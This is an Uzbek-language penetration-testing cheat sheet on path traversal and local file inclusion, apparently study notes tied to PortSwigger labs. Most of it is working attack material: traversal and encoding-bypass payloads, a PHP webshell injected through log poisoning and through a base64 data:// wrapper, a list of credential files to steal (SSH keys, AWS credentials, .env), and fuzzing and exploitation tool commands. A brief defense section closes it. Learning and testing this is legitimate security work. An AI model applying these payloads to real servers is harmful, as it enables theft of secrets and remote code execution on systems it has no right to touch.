# Path Traversal / LFI

> Lab yechimlari (PortSwigger'ning 6 ta labi) → `LABS.md`. Bu fayl — to'liq nazariya + payload + tool.

## Nima bu? (tushuncha)
Ilova fayl yo'lini foydalanuvchi inputidan quradi (`/var/www/images/ + filename`). Agar input
`../` (bir papka yuqoriga) ketma-ketligini filtrlamasa, sen mo'ljallangan papkadan **chiqib**,
server'ning istalgan faylini (`../../../etc/passwd`) o'qiysan. PHP kabi muhitda bu "Local File
Inclusion" (LFI) bo'lib, o'qilgan fayl **kod sifatida bajarilsa** RCE'ga aylanadi.

**Ildiz sabab:** ilova fayl yo'lini canonicalize qilmay (haqiqiy yo'lga keltirmay) ishlatadi va
papkadan chiqishni cheklamaydi. "Fayl nomi faqat shu papkada bo'ladi" degan taxmin buziladi.

## Turlari
- **Path traversal (file read)** — `../` bilan ixtiyoriy fayl o'qish.
- **Filtr bypass variantlari** — absolute path, non-recursive strip (`....//`), URL-encode (`%2e`),
  double-encode (`%252e`), null byte (`%00`), expected-prefix, expected-extension.
- **LFI → RCE** — PHP filter chain, log poisoning, `.user.ini`/`.htaccess`, `data://`, session include.
- **File write / overwrite** — upload nomida traversal → fayl ustiga yozish → RCE.

## Oqibatlar (IMPACT)
- **Maxfiy fayllarni o'qish**: `/etc/passwd`, config, source kod, `.env`, SSH key, cloud credential.
- **LFI → RCE**: log poisoning, php filter chain, session include.
- Ba'zan fayl yozish → webshell → RCE.
> O'qish = **High**, RCE'ga chiqsa **Critical**.

## Qayerdan qidiriladi
`?file=`, `?page=`, `?path=`, `?doc=`, `?template=`, `?lang=`, `?download=`,
`?img=`, `?include=`, fayl upload nomi.

## Aniqlash
```
?file=/etc/passwd
?file=../../../../etc/passwd
?file=....//....//....//etc/passwd
```
> Linux `root:x:0:0:` chiqsa tasdiq. Windows: `..\..\..\windows\win.ini`.

## Bypass jadvali
| Himoya | Bypass |
|--------|--------|
| `../` 1 marta o'chadi | `....//`, `..../\` |
| URL decode qiladi | `%2e%2e%2f`, `..%2f` |
| Double decode | `%252e%252e%252f` |
| Unicode | `%c0%ae%c0%ae%2f` |
| Prefix majburiy | `/var/www/../../etc/passwd` |
| `.php` qo'shadi | `%00` (eski), path truncation |

## LFI → RCE
```
# PHP source o'qish
?file=php://filter/convert.base64-encode/resource=config.php

# php filter chain → RCE (upload'siz!)
# php_filter_chain_generator.py bilan payload yasaysan

# Log poisoning
User-Agent: <?php system($_GET['c']); ?>
?file=/var/log/nginx/access.log&c=id

# data:// wrapper
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+&c=id
```

## Foydali fayllar
```
/etc/passwd  /etc/hosts  /proc/self/environ  ~/.ssh/id_rsa  ~/.aws/credentials
/var/www/html/config.php  .env  wp-config.php  C:\Windows\win.ini  web.config
```

## TOOLLAR

### ffuf — traversal fuzzing
```bash
ffuf -u "https://target.com/?file=FUZZ" -w lfi-payloads.txt -mr "root:x:"
```
> Har xil `../` variantini sinab, `root:x:` qaytganini — ya'ni `/etc/passwd` o'qilganini ushlaydi.

### dotdotpwn — traversal pattern generatori
```bash
dotdotpwn -m http -h target.com -f /etc/passwd -k "root:"
```
> Minglab traversal variantini (encoding, depth) avtomat yasab, `root:` topilgunicha uradi.

### LFISuite — LFI avtomat exploit
```bash
python2 lfisuite.py
```
> LFI topsa, log poisoning / wrapper bilan avtomat shell olishga urinadi.

### php_filter_chain_generator — upload'siz RCE
```bash
python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]);?>'
```
> `php://filter` zanjirini yasab beradi — hech narsa upload qilmasdan LFI'dan RCE chiqarasan.

### nuclei — ommaviy LFI
```bash
nuclei -l params_urls.txt -t ~/nuclei-templates/http/vulnerabilities/ -tags lfi,traversal
```
> Ko'p URL'da LFI/traversal'ni tayyor shablon bilan topadi.

## PoC
`/etc/passwd` o'qilganini ko'rsat. RCE bo'lsa `id` chiqishini ko'rsat.

## Himoya
User input'dan fayl yo'li qurma — ID→fayl mapping (allowlist), canonical path tekshir
(base dir ichidami), `../`/null/encoding rad, `allow_url_include=Off`.
